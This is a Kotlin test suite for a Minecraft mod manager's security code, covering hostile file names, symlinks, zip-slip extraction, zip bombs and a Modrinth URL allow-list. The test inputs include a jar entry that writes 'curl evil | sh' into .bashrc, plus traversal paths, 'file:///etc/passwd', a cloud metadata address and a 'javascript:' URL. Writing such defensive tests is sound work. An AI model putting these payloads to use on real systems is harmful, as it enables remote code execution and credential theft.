package catalyst.mods

import catalyst.mods.net.UrlPolicy
import catalyst.mods.security.ExtractLimits
import catalyst.mods.security.JarInspector
import catalyst.mods.security.SafePaths
import catalyst.mods.security.SafeZip
import org.junit.jupiter.api.Assumptions.assumeTrue
import org.junit.jupiter.api.Test
import org.junit.jupiter.api.io.TempDir
import org.junit.jupiter.params.ParameterizedTest
import org.junit.jupiter.params.provider.ValueSource
import java.io.ByteArrayOutputStream
import java.nio.file.Files
import java.nio.file.Path
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import kotlin.test.assertEquals
import kotlin.test.assertFailsWith
import kotlin.test.assertFalse
import kotlin.test.assertTrue

class SafePathsTest {
    @ParameterizedTest
    @ValueSource(
        strings = [
            "../../evil.jar", "..\\..\\evil.jar", "/etc/cron.d/evil.jar", "C:\\Windows\\evil.jar", "C:evil.jar",
            "mods/evil.jar", "..", ".jar", ".hidden.jar", "evil.jar.", "evil.jar ", " evil.jar",
            "CON.jar", "nul.jar", "com1.jar", "LPT9.jar", "evil\u0000.jar", "evil\n.jar",
            "mod\u202Eraj.exe", "evil.exe", "evil.jar.exe", "evil.sh", "a:b.jar", "what?.jar", "pipe|.jar",
        ],
    )
    fun `hostile or non-portable file names are refused`(name: String) {
        assertFailsWith<UnsafePathException> { SafePaths.fileName(name) }
    }

    @ParameterizedTest
    @ValueSource(strings = ["sodium-fabric-0.6.0+mc1.21.1.jar", "Iris 1.8.0 (1.21.1).jar", "fabric-api-0.102.0+1.21.1.jar", "ferritecore-7.0.0-fabric.JAR"])
    fun `ordinary mod file names are accepted unchanged`(name: String) {
        assertEquals(name, SafePaths.fileName(name))
    }

    @Test
    fun `an overlong name is refused`() {
        assertFailsWith<UnsafePathException> { SafePaths.fileName("a".repeat(250) + ".jar") }
    }

    @Test
    fun `child paths stay directly inside the folder`(@TempDir dir: Path) {
        assertEquals(dir.toAbsolutePath().normalize().resolve("ok.jar"), SafePaths.childOf(dir, "ok.jar"))
        assertFailsWith<UnsafePathException> { SafePaths.childOf(dir, "../outside.jar") }
    }

    @Test
    fun `a symlink planted in the mods folder is not written through`(@TempDir dir: Path) {
        val outside = Files.createDirectories(dir.resolve("outside")).resolve("target.jar")
        val mods = Files.createDirectories(dir.resolve("mods"))
        try {
            Files.createSymbolicLink(mods.resolve("link.jar"), outside)
        } catch (e: Exception) {
            assumeTrue(false, "symlinks need extra rights on this OS")
        }
        assertFailsWith<UnsafePathException> { SafePaths.childOf(mods, "link.jar") }
    }

    @ParameterizedTest
    @ValueSource(strings = ["../../evil.txt", "a/../../evil.txt", "/abs.txt", "C:/win.txt", "..\\evil.txt", "a/./../../b"])
    fun `archive entries that climb out are refused`(entry: String, @TempDir dir: Path) {
        assertFailsWith<UnsafePathException> { SafePaths.entryPath(dir, entry) }
    }
}

class ArchivesTest {
    @Test
    fun `a real fabric jar is recognised`(@TempDir dir: Path) {
        val jar = Files.write(dir.resolve("m.jar"), Jars.fabric("sodium"))
        assertEquals(setOf(Loader.FABRIC), JarInspector.inspect(jar).loaders)
    }

    @Test
    fun `a forge and a neoforge jar are told apart`(@TempDir dir: Path) {
        assertEquals(setOf(Loader.FORGE), JarInspector.inspect(Files.write(dir.resolve("f.jar"), Jars.forge("x"))).loaders)
        val neo = Jars.build("META-INF/neoforge.mods.toml" to "", "x/A.class" to "")
        assertEquals(setOf(Loader.NEOFORGE), JarInspector.inspect(Files.write(dir.resolve("n.jar"), neo)).loaders)
    }

    @Test
    fun `something that is not a zip is refused`(@TempDir dir: Path) {
        val fake = Files.write(dir.resolve("m.jar"), "<html>not found</html>".toByteArray())
        assertFailsWith<IntegrityException> { JarInspector.inspect(fake) }
        val exe = Files.write(dir.resolve("x.jar"), byteArrayOf(0x4d, 0x5a, 0x90.toByte(), 0x00) + ByteArray(100))
        assertFailsWith<IntegrityException> { JarInspector.inspect(exe) }
    }

    @Test
    fun `a zip header with garbage behind it is refused`(@TempDir dir: Path) {
        val broken = Files.write(dir.resolve("m.jar"), Jars.fabric("x").copyOf(40))
        assertFailsWith<IntegrityException> { JarInspector.inspect(broken) }
    }

    @Test
    fun `a jar carrying a path-traversal entry is refused`(@TempDir dir: Path) {
        val evil = Jars.build("fabric.mod.json" to "{}", "../../../../.bashrc" to "curl evil | sh")
        assertFailsWith<IntegrityException> { JarInspector.inspect(Files.write(dir.resolve("m.jar"), evil)) }
    }

    @Test
    fun `safe extraction writes inside the folder`(@TempDir dir: Path) {
        val zip = Files.write(dir.resolve("pack.zip"), Jars.build("assets/a.txt" to "a", "pack.mcmeta" to "{}"))
        val out = dir.resolve("out")
        val written = SafeZip.extract(zip, out)
        assertEquals(2, written.size)
        assertTrue(written.all { it.startsWith(out) })
    }

    @Test
    fun `zip-slip extraction is refused and leaves nothing behind`(@TempDir dir: Path) {
        val zip = Files.write(dir.resolve("pack.zip"), Jars.build("ok.txt" to "fine", "../escaped.txt" to "evil"))
        val out = dir.resolve("out")
        assertFailsWith<UnsafePathException> { SafeZip.extract(zip, out) }
        assertFalse(Files.exists(dir.resolve("escaped.txt")))
        assertFalse(Files.exists(out.resolve("ok.txt")), "partial extraction is rolled back")
    }

    @Test
    fun `a zip bomb is stopped`(@TempDir dir: Path) {
        val bytes = ByteArrayOutputStream().also { b ->
            ZipOutputStream(b).use { z ->
                z.putNextEntry(ZipEntry("bomb.bin"))
                val zeros = ByteArray(1 shl 20)
                repeat(64) { z.write(zeros) }
                z.closeEntry()
            }
        }.toByteArray()
        val zip = Files.write(dir.resolve("bomb.zip"), bytes)
        assertFailsWith<IntegrityException> { SafeZip.extract(zip, dir.resolve("out"), ExtractLimits(maxRatio = 100)) }
    }
}

class UrlPolicyTest {
    private val policy = UrlPolicy(UrlPolicy.MODRINTH + "backend.test")

    @ParameterizedTest
    @ValueSource(
        strings = [
            "http://cdn.modrinth.com/data/x.jar", "file:///etc/passwd", "ftp://cdn.modrinth.com/x.jar",
            "https://evil.example/x.jar", "https://cdn.modrinth.com.evil.example/x.jar", "https://evilmodrinth.com/x.jar",
            "https://user:pass@cdn.modrinth.com/x.jar", "https://cdn.modrinth.com:8443/x.jar", "https://169.254.169.254/latest",
            "not a url at all", "javascript:alert(1)",
        ],
    )
    fun `only https on known hosts is fetched`(url: String) {
        assertFailsWith<UnsafeUrlException> { policy.check(url) }
    }

    @Test
    fun `modrinth cdn and the backend are allowed`() {
        policy.check("https://cdn.modrinth.com/data/AANobbMI/versions/x/sodium.jar")
        policy.check("https://CDN.Modrinth.com/data/x.jar")
        policy.check("https://backend.test/api/mods/curseforge/search")
    }
}
